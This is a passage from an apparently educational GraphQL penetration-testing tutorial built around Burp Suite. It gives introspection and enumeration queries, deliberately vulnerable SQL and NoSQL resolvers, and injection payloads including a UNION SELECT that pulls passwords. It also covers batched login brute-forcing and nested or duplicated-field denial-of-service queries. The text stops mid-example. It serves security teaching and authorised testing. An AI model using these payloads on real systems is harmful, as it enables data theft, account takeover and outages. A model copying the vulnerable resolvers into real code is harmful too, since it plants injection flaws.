API.\u003c/p\u003e\n\u003ch2\u003eGraphQL Reconnaissance Techniques\u003c/h2\u003e\n\u003cp\u003eThe first phase of any GraphQL security assessment involves gathering information about the API structure. GraphQL's introspection feature makes this significantly easier than with REST APIs, allowing attackers to map out the entire API surface in minutes.\u003c/p\u003e\n\u003ch3\u003eLeveraging Introspection\u003c/h3\u003e\n\u003cp\u003eIntrospection is a built-in GraphQL feature that allows clients to query the schema for information about available types, fields, queries, and mutations. While useful for development, it's a security liability in production environments.\u003c/p\u003e\n\u003cp\u003eHere's how to perform a basic introspection query:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis verbose query returns detailed information about the entire schema, including:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAll available queries and mutations\u003c/li\u003e\n\u003cli\u003eAll defined types and their fields\u003c/li\u003e\n\u003cli\u003eRelationships between types\u003c/li\u003e\n\u003cli\u003eArgument requirements for each operation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTo perform this reconnaissance with Burp Suite:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSet up your GraphQL request in Burp Repeater\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate a POST request to the GraphQL endpoint\u003c/li\u003e\n\u003cli\u003eSet the Content-Type header to \u003ccode\u003eapplication/json\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eIn the request body, include: \u003ccode\u003e{\"query\": \"query { __schema { types { name kind fields { name } } } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eThis simplified introspection query will list types and their fields\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze the introspection response\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSend the request and analyze the JSON response\u003c/li\u003e\n\u003cli\u003eLook for sensitive object types like \u003ccode\u003eUser\u003c/code\u003e, \u003ccode\u003eAdmin\u003c/code\u003e, \u003ccode\u003eToken\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eNote fields with names suggesting sensitive data (password, token, secret)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExpand your reconnaissance\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOnce you have the type names, craft more specific introspection queries\u003c/li\u003e\n\u003cli\u003eFor example, to explore a specific type: \u003ccode\u003e{\"query\": \"query { __type(name: \\\"User\\\") { name fields { name type { name kind ofType { name kind } } } } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSave findings in Burp\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse the \"Save\" feature in Burp Repeater to keep important responses for reference\u003c/li\u003e\n\u003cli\u003eCreate a separate request for each important schema component\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eWhen Introspection is Disabled\u003c/h3\u003e\n\u003cp\u003eMany production GraphQL APIs disable introspection as a security measure. However, this doesn't completely prevent reconnaissance. Several manual techniques can help map a GraphQL API without introspection:\u003c/p\u003e\n\u003ch4\u003e1. Known query fuzzing with Burp Intruder\u003c/h4\u003e\n\u003cp\u003eSince GraphQL operations follow predictable patterns, we can use Burp Intruder to fuzz the API with common query names:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a base GraphQL query in Burp Repeater\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { FUZZ { id } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSend to Burp Intruder\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRight-click and select \"Send to Intruder\"\u003c/li\u003e\n\u003cli\u003eIn the Positions tab, clear all automatically set positions\u003c/li\u003e\n\u003cli\u003eManually add the position markers around the field name: \u003ccode\u003e{\"query\": \"query { §FUZZ§ { id } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfigure the payload\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIn the Payloads tab, set Payload type to \"Simple list\"\u003c/li\u003e\n\u003cli\u003eAdd common GraphQL query names to the list:\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003euser\nusers\ngetUser\ngetUserById\ngetUserByEmail\nproduct\nproducts\ngetProduct\ngetProductById\npost\nposts\ngetPosts\ngetPostsByUser\norder\norders\ngetOrder\nlogin\nauthenticate\nsearch\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfigure attack options\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIn the Options tab, set \"Grep - Match\" to look for patterns that indicate success\u003c/li\u003e\n\u003cli\u003eAdd patterns like \"data\", \"errors\", or specific error messages about arguments\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eStart the attack and analyze results\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLaunch the attack and review the results\u003c/li\u003e\n\u003cli\u003eLook for responses that differ from the rest (different status code, length, or content)\u003c/li\u003e\n\u003cli\u003eValid fields will typically return specific errors about missing required arguments\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003e2. Error message analysis with Burp Repeater\u003c/h4\u003e\n\u003cp\u003eGraphQL error messages are often verbose and reveal information about the schema. We can intentionally trigger errors to learn more about the API:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSend an invalid query\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { nonExistentField }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze the error response\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for \"Did you mean\" suggestions in error messages\u003c/li\u003e\n\u003cli\u003eCheck for field names mentioned in error context\u003c/li\u003e\n\u003cli\u003eNote any schema information leaked in the error messages\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIterate based on error information\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse revealed field names to craft new queries\u003c/li\u003e\n\u003cli\u003eTry variations of suggested field names\u003c/li\u003e\n\u003cli\u003eBuild up a schema map based on error information\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003e3. Alias enumeration with Burp Repeater\u003c/h4\u003e\n\u003cp\u003eWe can use GraphQL aliases to test multiple potential fields in a single query:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate an aliased query\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { \n  a1: user { id name } \n  a2: users { id name }\n  a3: accounts { id name }\n  a4: customers { id name }\n}\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze the response\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eValid fields will return data under their respective aliases\u003c/li\u003e\n\u003cli\u003eInvalid fields will produce errors that can be matched to specific aliases\u003c/li\u003e\n\u003cli\u003eUse this information to identify valid query fields\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eRepository reconnaissance\u003c/h3\u003e\n\u003cp\u003eFor open source applications or those with public repositories, examining the codebase can reveal GraphQL schemas and resolvers:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Search for GraphQL schema files in a GitHub repository\ngit clone https://github.com/target-organization/target-application.git\ncd target-application\ngrep -r \"type Query\" --include=\"*.graphql\" --include=\"*.js\" --include=\"*.ts\" .\ngrep -r \"extend type Query\" --include=\"*.graphql\" --include=\"*.js\" --include=\"*.ts\" .\ngrep -r \"gql\\`\" --include=\"*.js\" --include=\"*.ts\" .\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCommon files to look for include:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eschema.graphql\u003c/code\u003e or \u003ccode\u003eschema.gql\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e*.typeDefs.js\u003c/code\u003e or \u003ccode\u003e*.typeDefs.ts\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eJavaScript/TypeScript files with embedded GraphQL using tagged template literals\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eExploiting GraphQL Vulnerabilities\u003c/h2\u003e\n\u003cp\u003eNow that we understand how to map a GraphQL API, let's examine various attack vectors and exploitation techniques using Burp Suite.\u003c/p\u003e\n\u003ch3\u003eInformation Disclosure through Overfetching\u003c/h3\u003e\n\u003cp\u003eUnlike REST APIs where each endpoint returns a fixed data structure, GraphQL allows clients to request exactly what they need. However, this flexibility means APIs that don't implement proper authorization checks at the field level can leak sensitive information.\u003c/p\u003e\n\u003cp\u003eConsider this query:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery GetUserProfile {\n  user(id: \"1\") {\n    username\n    email\n    profile {\n      firstName\n      lastName\n      socialSecurityNumber  # Sensitive field!\n      dateOfBirth\n      phoneNumber\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf authorization is only checked at the operation level (can the user access \u003ccode\u003euser\u003c/code\u003e?) but not at the field level (can the user access \u003ccode\u003esocialSecurityNumber\u003c/code\u003e?), sensitive information could be exposed.\u003c/p\u003e\n\u003cp\u003eTesting for overfetching vulnerabilities with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a base query for a resource\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer YOUR_TOKEN\n\n{\"query\": \"query { user(id: \\\"1\\\") { id username email } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIncrementally add potentially sensitive fields\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eStart with fields that are likely to exist but not shown in the UI\u003c/li\u003e\n\u003cli\u003eAdd fields like \u003ccode\u003epassword\u003c/code\u003e, \u003ccode\u003eresetToken\u003c/code\u003e, \u003ccode\u003erole\u003c/code\u003e, \u003ccode\u003epermissions\u003c/code\u003e, etc.\u003c/li\u003e\n\u003cli\u003eTry nested fields like \u003ccode\u003eprofile { socialSecurityNumber }\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze responses for sensitive data exposure\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for fields that return actual values instead of null or errors\u003c/li\u003e\n\u003cli\u003eCompare the results with what's available in the application UI\u003c/li\u003e\n\u003cli\u003eNote any sensitive data that shouldn't be accessible to your user role\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis manual approach allows you to carefully analyze each response and detect subtle information leakage.\u003c/p\u003e\n\u003ch3\u003eGraphQL Injection\u003c/h3\u003e\n\u003cp\u003eGraphQL is vulnerable to injection attacks similar to SQL injection. These occur when user-supplied input is not properly sanitized before being used in resolver functions.\u003c/p\u003e\n\u003ch4\u003eSQL Injection via GraphQL\u003c/h4\u003e\n\u003cp\u003eConsider a resolver implemented like this in Node.js:\u003c/p\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003econst resolvers = {\n  Query: {\n    user: async (_, { username }) =\u003e {\n      // VULNERABILITY: Directly interpolating user input into SQL query\n      const query = `SELECT * FROM users WHERE username = '${username}'`;\n      return await db.raw(query);\n    }\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis resolver is vulnerable to SQL injection. An attacker could exploit it with a query like:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  user(username: \"admin' OR 1=1 --\") {\n    id\n    username\n    email\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAt the database level, this would execute:\u003c/p\u003e\n\u003cpre class=\"language-sql\"\u003e\u003ccode class=\"language-sql\"\u003eSELECT * FROM users WHERE username = 'admin' OR 1=1 --'\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003eOR 1=1\u003c/code\u003e condition ensures the query returns all users, potentially leaking information about other accounts.\u003c/p\u003e\n\u003cp\u003eTesting for SQL injection in GraphQL with Burp Suite:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIdentify injectable parameters\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate a request in Burp Repeater targeting a GraphQL query that accepts user input\u003c/li\u003e\n\u003cli\u003eExample: \u003ccode\u003e{\"query\": \"query { user(username: \\\"admin\\\") { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest for SQL injection with Burp Repeater\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eModify the parameter to include SQL injection payloads:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e{\"query\": \"query { user(username: \\\"admin' OR 1=1 --\\\") { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e{\"query\": \"query { user(username: \\\"admin\\\\\\\" OR \\\\\\\"1\\\\\\\"=\\\\\\\"1\\\") { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e{\"query\": \"query { user(username: \\\"' UNION SELECT 1,username,password FROM users --\\\") { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUse Burp Intruder for systematic testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSend your request to Intruder\u003c/li\u003e\n\u003cli\u003eSet the position around the injection point: \u003ccode\u003e{\"query\": \"query { user(username: \\\"§admin§\\\") { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUse a list of SQL injection payloads from Burp's built-in payload options\u003c/li\u003e\n\u003cli\u003eAdd grep match rules to identify successful injections (look for multiple records, error messages, etc.)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze the results\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for responses with different lengths or content\u003c/li\u003e\n\u003cli\u003eCheck for database error messages that leak information\u003c/li\u003e\n\u003cli\u003eVerify if any payloads return more data than expected (indicating successful injection)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003eNoSQL Injection\u003c/h4\u003e\n\u003cp\u003eGraphQL APIs built on NoSQL databases like MongoDB are vulnerable to NoSQL injection attacks:\u003c/p\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e// Vulnerable resolver using MongoDB\nconst resolvers = {\n  Query: {\n    user: async (_, { username }) =\u003e {\n      // VULNERABILITY: Directly using user input in query object\n      return await UserCollection.findOne({ username: username });\n    }\n  }\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf the input isn't properly validated, an attacker could send:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  user(username: {$ne: null}) {\n    id\n    username\n    email\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn MongoDB, this would translate to finding a user where the username is not equal to null—essentially returning the first user in the database.\u003c/p\u003e\n\u003cp\u003eTesting for NoSQL injection with Burp Suite:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a base request in Burp Repeater\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { user(username: \\\"admin\\\") { id username email } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest NoSQL operator injections\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReplace the parameter value with NoSQL operators:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e{\"query\": \"query { user(username: {\\\"$ne\\\": null}) { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e{\"query\": \"query { user(username: {\\\"$regex\\\": \\\"^adm\\\"}) { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e{\"query\": \"query { user(username: {\\\"$gt\\\": \\\"\\\"}) { id username email } }\"}\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUse Burp Intruder for more comprehensive testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet up positions around the parameter value\u003c/li\u003e\n\u003cli\u003eUse a list of NoSQL injection payloads\u003c/li\u003e\n\u003cli\u003eConfigure grep match rules to identify successful injections\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze results\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for responses that return data when they shouldn't\u003c/li\u003e\n\u003cli\u003eCheck for different error messages that reveal information about the database\u003c/li\u003e\n\u003cli\u003eVerify if operators like \u003ccode\u003e$ne\u003c/code\u003e or \u003ccode\u003e$regex\u003c/code\u003e work, indicating NoSQL injection vulnerabilities\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eBatching Attacks\u003c/h3\u003e\n\u003cp\u003eGraphQL allows sending multiple operations in a single request, which can be abused for various attacks:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003e[\n  { \n    \"query\": \"query { user(id: \\\"1\\\") { id username } }\"\n  },\n  {\n    \"query\": \"query { user(id: \\\"2\\\") { id username } }\"\n  },\n  {\n    \"query\": \"query { user(id: \\\"3\\\") { id username } }\"\n  }\n  // ... hundreds more queries\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis can be used for:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eRate limit bypass\u003c/strong\u003e: If rate limiting is implemented per-request rather than per-operation\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBrute force attacks\u003c/strong\u003e: Testing many different values in a single request\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eResource exhaustion\u003c/strong\u003e: Overwhelming the server with many operations\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eTesting batching attacks with Burp Suite:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a batch request template in Burp Repeater\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n[\n  {\"query\": \"query { user(id: \\\"1\\\") { id username } }\"},\n  {\"query\": \"query { user(id: \\\"2\\\") { id username } }\"}\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTesting rate limit bypass\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd more queries to the batch to see if you can make more queries than normally allowed\u003c/li\u003e\n\u003cli\u003eMonitor for rate limit error messages\u003c/li\u003e\n\u003cli\u003eIf no errors occur, the API may be vulnerable to rate limit bypassing\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBrute force attacks with Burp Intruder\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFor password brute forcing, create a batch template like:\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"§password§\\\") { token } }\"},\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"§password2§\\\") { token } }\"},\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"§password3§\\\") { token } }\"}\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003eSend to Intruder and configure Cluster Bomb attack type\u003c/li\u003e\n\u003cli\u003eSet payloads for each position from your password list\u003c/li\u003e\n\u003cli\u003eConfigure grep patterns to identify successful logins\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eResource exhaustion testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate a batch with increasingly complex or numerous queries\u003c/li\u003e\n\u003cli\u003eMonitor server response times and errors\u003c/li\u003e\n\u003cli\u003eGradually increase the load until you observe performance degradation\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eDenial of Service (DoS) Attacks\u003c/h3\u003e\n\u003cp\u003eGraphQL's flexibility makes it particularly vulnerable to DoS attacks. Let's examine how to test these using Burp Suite:\u003c/p\u003e\n\u003ch4\u003eNested Query Attacks\u003c/h4\u003e\n\u003cp\u003eGraphQL allows deeply nested queries that can cause exponential performance degradation:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery NestedFriends {\n  user(id: \"1\") {\n    friends {\n      friends {\n        friends {\n          friends {\n            friends {\n              friends {\n                # And so on...\n    name\n    email\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf each user has multiple friends, this query can cause an exponential explosion in the number of resolver executions, similar to the classic billion laughs XML attack.\u003c/p\u003e\n\u003cp\u003eTesting for nested query vulnerabilities with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a base query with a potential cyclic relationship\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { user(id: \\\"1\\\") { friends { name } } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIncrementally add nesting levels and observe response times\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd one level of nesting at a time\u003c/li\u003e\n\u003cli\u003eMeasure the response time for each level\u003c/li\u003e\n\u003cli\u003eLook for exponential increases in response time\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFind the breaking point\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eContinue adding nesting levels until:\n\u003cul\u003e\n\u003cli\u003eThe request times out\u003c/li\u003e\n\u003cli\u003eThe server returns an error\u003c/li\u003e\n\u003cli\u003eThe response time becomes unreasonably long\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDocument your findings\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNote the nesting level where performance degrades significantly\u003c/li\u003e\n\u003cli\u003eRecord the response time pattern (linear vs. exponential growth)\u003c/li\u003e\n\u003cli\u003eSave the query that demonstrates the vulnerability\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003eField Duplication Attacks\u003c/h4\u003e\n\u003cp\u003eAnother DoS technique involves duplicating fields many times:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery DuplicatedFields {\n  user(id: \"1\") {\n    username\n    email\n    username\n    email\n    username\n    email\n    # Repeated thousands of times\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSome GraphQL implementations process each field instance separately, causing performance issues with enough duplication.\u003c/p\u003e\n\u003cp\u003eTesting field duplication with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a base query in Burp Repeater\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { user(id: \\\"1\\\") { username email } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUse Burp's text editor to duplicate fields\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCopy and paste the fields multiple times\u003c/li\u003e\n\u003cli\u003eStart with 10 duplications, then 100, then 1000, etc.\u003c/li\u003e\n\u003cli\u003eObserve the response time for each test\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a request that triggers the vulnerability\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFind the number of duplications that causes significant slowdown\u003c/li\u003e\n\u003cli\u003eDocument the performance impact\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003eResource-Intensive Operations\u003c/h4\u003e\n\u003cp\u003eAttackers can target resource-intensive operations within the API:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery ExpensiveOperations {\n  searchProducts(query: \"a\") {\n    # Full-text search operation\n    id\n    name\n    price\n  }\n  \n  geoSearch(lat: 37.7749, lng: -122.4194, radius: 100) {\n    # Geospatial search operation\n    id\n    name\n    distance\n  